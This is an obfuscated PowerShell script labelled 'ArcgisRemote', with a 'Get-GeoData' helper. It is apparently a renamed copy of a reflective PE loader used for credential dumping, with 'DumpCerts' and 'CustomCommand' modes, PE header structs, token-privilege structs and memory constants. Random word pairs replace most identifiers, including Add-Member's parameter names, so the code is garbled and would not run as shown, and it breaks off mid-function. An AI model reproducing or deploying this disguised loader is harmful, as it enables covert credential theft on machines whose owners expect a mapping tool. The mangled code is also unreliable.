function ArcgisRemote
{

[CmdletBinding(DefaultParameterSetName="RunPreCheck")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$BladersDemerit,

    [Parameter(ParameterSetName = "RunPreCheck", Position = 1)]
    [Switch]
    $DepassGammons,

    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $BecunaBurled,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $BermedBrochan
)

Set-StrictMode -Version 2


$BluingsBettine = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$GoopierAnlas,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$DargGabon,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$DitalCrucily,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$EnneadAgon,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$AratoryDisnew,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $BobbishCharmed
	)
	
	Function Get-GeoData
	{
		$BetteBryce = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$DaffishGolder = [AppDomain]::CurrentDomain
		$BabeletCorbeau = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$CarmenGawping = $DaffishGolder.DefineDynamicAssembly($BabeletCorbeau, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$AmuseCagy = $CarmenGawping.DefineDynamicModule('DynamicModule', $false)
		$BantamsClipse = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$CaulsCaelum = $AmuseCagy.DefineEnum('MachineType', 'Public', [UInt16])
		$CaulsCaelum.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$CaulsCaelum.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$CaulsCaelum.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$CaulsCaelum.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$ClaughtBoosy = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys MachineType -CampingArkite $ClaughtBoosy

		#Enum MagicType
		$CaulsCaelum = $AmuseCagy.DefineEnum('MagicType', 'Public', [UInt16])
		$CaulsCaelum.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$AgialidBistre = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys MagicType -CampingArkite $AgialidBistre

		#Enum SubSystemType
		$CaulsCaelum = $AmuseCagy.DefineEnum('SubSystemType', 'Public', [UInt16])
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$BicorneAbnet = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys SubSystemType -CampingArkite $BicorneAbnet

		#Enum DllCharacteristicsType
		$CaulsCaelum = $AmuseCagy.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$CaulsCaelum.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$CaulsCaelum.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$CaulsCaelum.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$CaulsCaelum.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$CaulsCaelum.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$CaulsCaelum.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DeckedClue = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys DllCharacteristicsType -CampingArkite $DeckedClue

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_DATA_DIRECTORY', $GratiaFirer, [System.ValueType], 8)
		($CaulsCaelum.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($CaulsCaelum.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$FicinCurrant = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_DATA_DIRECTORY -CampingArkite $FicinCurrant

		#Struct IMAGE_FILE_HEADER
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_FILE_HEADER', $GratiaFirer, [System.ValueType], 20)
		$CaulsCaelum.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$FloggedFundal = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_FILE_HEADER -CampingArkite $FloggedFundal

		#Struct IMAGE_OPTIONAL_HEADER64
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_OPTIONAL_HEADER64', $GratiaFirer, [System.ValueType], 240)
		($CaulsCaelum.DefineField('Magic', $AgialidBistre, 'Public')).SetOffset(0) | Out-Null
		($CaulsCaelum.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($CaulsCaelum.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($CaulsCaelum.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($CaulsCaelum.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($CaulsCaelum.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($CaulsCaelum.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($CaulsCaelum.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($CaulsCaelum.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($CaulsCaelum.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($CaulsCaelum.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($CaulsCaelum.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($CaulsCaelum.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($CaulsCaelum.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($CaulsCaelum.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($CaulsCaelum.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($CaulsCaelum.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($CaulsCaelum.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($CaulsCaelum.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($CaulsCaelum.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($CaulsCaelum.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($CaulsCaelum.DefineField('Subsystem', $BicorneAbnet, 'Public')).SetOffset(68) | Out-Null
		($CaulsCaelum.DefineField('DllCharacteristics', $DeckedClue, 'Public')).SetOffset(70) | Out-Null
		($CaulsCaelum.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($CaulsCaelum.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($CaulsCaelum.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($CaulsCaelum.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($CaulsCaelum.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($CaulsCaelum.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($CaulsCaelum.DefineField('ExportTable', $FicinCurrant, 'Public')).SetOffset(112) | Out-Null
		($CaulsCaelum.DefineField('ImportTable', $FicinCurrant, 'Public')).SetOffset(120) | Out-Null
		($CaulsCaelum.DefineField('ResourceTable', $FicinCurrant, 'Public')).SetOffset(128) | Out-Null
		($CaulsCaelum.DefineField('ExceptionTable', $FicinCurrant, 'Public')).SetOffset(136) | Out-Null
		($CaulsCaelum.DefineField('CertificateTable', $FicinCurrant, 'Public')).SetOffset(144) | Out-Null
		($CaulsCaelum.DefineField('BaseRelocationTable', $FicinCurrant, 'Public')).SetOffset(152) | Out-Null
		($CaulsCaelum.DefineField('Debug', $FicinCurrant, 'Public')).SetOffset(160) | Out-Null
		($CaulsCaelum.DefineField('Architecture', $FicinCurrant, 'Public')).SetOffset(168) | Out-Null
		($CaulsCaelum.DefineField('GlobalPtr', $FicinCurrant, 'Public')).SetOffset(176) | Out-Null
		($CaulsCaelum.DefineField('TLSTable', $FicinCurrant, 'Public')).SetOffset(184) | Out-Null
		($CaulsCaelum.DefineField('LoadConfigTable', $FicinCurrant, 'Public')).SetOffset(192) | Out-Null
		($CaulsCaelum.DefineField('BoundImport', $FicinCurrant, 'Public')).SetOffset(200) | Out-Null
		($CaulsCaelum.DefineField('IAT', $FicinCurrant, 'Public')).SetOffset(208) | Out-Null
		($CaulsCaelum.DefineField('DelayImportDescriptor', $FicinCurrant, 'Public')).SetOffset(216) | Out-Null
		($CaulsCaelum.DefineField('CLRRuntimeHeader', $FicinCurrant, 'Public')).SetOffset(224) | Out-Null
		($CaulsCaelum.DefineField('Reserved', $FicinCurrant, 'Public')).SetOffset(232) | Out-Null
		$DieuDreg = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_OPTIONAL_HEADER64 -CampingArkite $DieuDreg

		#Struct IMAGE_OPTIONAL_HEADER32
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_OPTIONAL_HEADER32', $GratiaFirer, [System.ValueType], 224)
		($CaulsCaelum.DefineField('Magic', $AgialidBistre, 'Public')).SetOffset(0) | Out-Null
		($CaulsCaelum.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($CaulsCaelum.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($CaulsCaelum.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($CaulsCaelum.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($CaulsCaelum.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($CaulsCaelum.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($CaulsCaelum.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($CaulsCaelum.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($CaulsCaelum.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($CaulsCaelum.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($CaulsCaelum.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($CaulsCaelum.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($CaulsCaelum.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($CaulsCaelum.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($CaulsCaelum.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($CaulsCaelum.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($CaulsCaelum.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($CaulsCaelum.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($CaulsCaelum.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($CaulsCaelum.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($CaulsCaelum.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($CaulsCaelum.DefineField('Subsystem', $BicorneAbnet, 'Public')).SetOffset(68) | Out-Null
		($CaulsCaelum.DefineField('DllCharacteristics', $DeckedClue, 'Public')).SetOffset(70) | Out-Null
		($CaulsCaelum.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($CaulsCaelum.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($CaulsCaelum.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($CaulsCaelum.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($CaulsCaelum.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($CaulsCaelum.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($CaulsCaelum.DefineField('ExportTable', $FicinCurrant, 'Public')).SetOffset(96) | Out-Null
		($CaulsCaelum.DefineField('ImportTable', $FicinCurrant, 'Public')).SetOffset(104) | Out-Null
		($CaulsCaelum.DefineField('ResourceTable', $FicinCurrant, 'Public')).SetOffset(112) | Out-Null
		($CaulsCaelum.DefineField('ExceptionTable', $FicinCurrant, 'Public')).SetOffset(120) | Out-Null
		($CaulsCaelum.DefineField('CertificateTable', $FicinCurrant, 'Public')).SetOffset(128) | Out-Null
		($CaulsCaelum.DefineField('BaseRelocationTable', $FicinCurrant, 'Public')).SetOffset(136) | Out-Null
		($CaulsCaelum.DefineField('Debug', $FicinCurrant, 'Public')).SetOffset(144) | Out-Null
		($CaulsCaelum.DefineField('Architecture', $FicinCurrant, 'Public')).SetOffset(152) | Out-Null
		($CaulsCaelum.DefineField('GlobalPtr', $FicinCurrant, 'Public')).SetOffset(160) | Out-Null
		($CaulsCaelum.DefineField('TLSTable', $FicinCurrant, 'Public')).SetOffset(168) | Out-Null
		($CaulsCaelum.DefineField('LoadConfigTable', $FicinCurrant, 'Public')).SetOffset(176) | Out-Null
		($CaulsCaelum.DefineField('BoundImport', $FicinCurrant, 'Public')).SetOffset(184) | Out-Null
		($CaulsCaelum.DefineField('IAT', $FicinCurrant, 'Public')).SetOffset(192) | Out-Null
		($CaulsCaelum.DefineField('DelayImportDescriptor', $FicinCurrant, 'Public')).SetOffset(200) | Out-Null
		($CaulsCaelum.DefineField('CLRRuntimeHeader', $FicinCurrant, 'Public')).SetOffset(208) | Out-Null
		($CaulsCaelum.DefineField('Reserved', $FicinCurrant, 'Public')).SetOffset(216) | Out-Null
		$ChengDobra = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_OPTIONAL_HEADER32 -CampingArkite $ChengDobra

		#Struct IMAGE_NT_HEADERS64
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_NT_HEADERS64', $GratiaFirer, [System.ValueType], 264)
		$CaulsCaelum.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('FileHeader', $FloggedFundal, 'Public') | Out-Null
		$CaulsCaelum.DefineField('OptionalHeader', $DieuDreg, 'Public') | Out-Null
		$DeftAythya = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_NT_HEADERS64 -CampingArkite $DeftAythya
		
		#Struct IMAGE_NT_HEADERS32
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_NT_HEADERS32', $GratiaFirer, [System.ValueType], 248)
		$CaulsCaelum.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('FileHeader', $FloggedFundal, 'Public') | Out-Null
		$CaulsCaelum.DefineField('OptionalHeader', $ChengDobra, 'Public') | Out-Null
		$GeoponyCran = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_NT_HEADERS32 -CampingArkite $GeoponyCran

		#Struct IMAGE_DOS_HEADER
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_DOS_HEADER', $GratiaFirer, [System.ValueType], 64)
		$CaulsCaelum.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$CapomoEaver = $CaulsCaelum.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$AlgorsFinales = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$BaraunaArdu = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$DromeAnimis = New-Object System.Reflection.Emit.CustomAttributeBuilder($BantamsClipse, $AlgorsFinales, $BaraunaArdu, @([Int32] 4))
		$CapomoEaver.SetCustomAttribute($DromeAnimis)

		$CaulsCaelum.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$FlashesAllonge = $CaulsCaelum.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$AlgorsFinales = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$DromeAnimis = New-Object System.Reflection.Emit.CustomAttributeBuilder($BantamsClipse, $AlgorsFinales, $BaraunaArdu, @([Int32] 10))
		$FlashesAllonge.SetCustomAttribute($DromeAnimis)

		$CaulsCaelum.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$BharalFavella = $CaulsCaelum.CreateType()	
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_DOS_HEADER -CampingArkite $BharalFavella

		#Struct IMAGE_SECTION_HEADER
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_SECTION_HEADER', $GratiaFirer, [System.ValueType], 40)

		$CheirGoogly = $CaulsCaelum.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$AlgorsFinales = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$DromeAnimis = New-Object System.Reflection.Emit.CustomAttributeBuilder($BantamsClipse, $AlgorsFinales, $BaraunaArdu, @([Int32] 8))
		$CheirGoogly.SetCustomAttribute($DromeAnimis)

		$CaulsCaelum.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$FeetForams = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_SECTION_HEADER -CampingArkite $FeetForams

		#Struct IMAGE_BASE_RELOCATION
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_BASE_RELOCATION', $GratiaFirer, [System.ValueType], 8)
		$CaulsCaelum.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$CeteneCalaba = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_BASE_RELOCATION -CampingArkite $CeteneCalaba

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_IMPORT_DESCRIPTOR', $GratiaFirer, [System.ValueType], 20)
		$CaulsCaelum.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('Name', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$DiscantCrotons = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_IMPORT_DESCRIPTOR -CampingArkite $DiscantCrotons

		#Struct IMAGE_EXPORT_DIRECTORY
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('IMAGE_EXPORT_DIRECTORY', $GratiaFirer, [System.ValueType], 40)
		$CaulsCaelum.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$CaulsCaelum.DefineField('Name', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('Base', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$FelsparCognise = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys IMAGE_EXPORT_DIRECTORY -CampingArkite $FelsparCognise
		
		#Struct LUID
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('LUID', $GratiaFirer, [System.ValueType], 8)
		$CaulsCaelum.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$BurnetChoses = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys LUID -CampingArkite $BurnetChoses
		
		#Struct LUID_AND_ATTRIBUTES
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('LUID_AND_ATTRIBUTES', $GratiaFirer, [System.ValueType], 12)
		$CaulsCaelum.DefineField('Luid', $BurnetChoses, 'Public') | Out-Null
		$CaulsCaelum.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$EucriteBirls = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys LUID_AND_ATTRIBUTES -CampingArkite $EucriteBirls
		
		#Struct TOKEN_PRIVILEGES
		$GratiaFirer = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$CaulsCaelum = $AmuseCagy.DefineType('TOKEN_PRIVILEGES', $GratiaFirer, [System.ValueType], 16)
		$CaulsCaelum.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$CaulsCaelum.DefineField('Privileges', $EucriteBirls, 'Public') | Out-Null
		$GlisterBabbitt = $CaulsCaelum.CreateType()
		$BetteBryce | Add-Member -MemberType NoteProperty -CrenelsBatboys TOKEN_PRIVILEGES -CampingArkite $GlisterBabbitt

		return $BetteBryce
	}

	Function Get-FunksGoric
	{
		$FunksGoric = New-Object System.Object
		
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys MEM_COMMIT -CampingArkite 0x00001000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys MEM_RESERVE -CampingArkite 0x00002000
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_NOACCESS -CampingArkite 0x01
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_READONLY -CampingArkite 0x02
		$FunksGoric | Add-Member -MemberType NoteProperty -CrenelsBatboys PAGE_READWRITE -CampingArkite 0x04
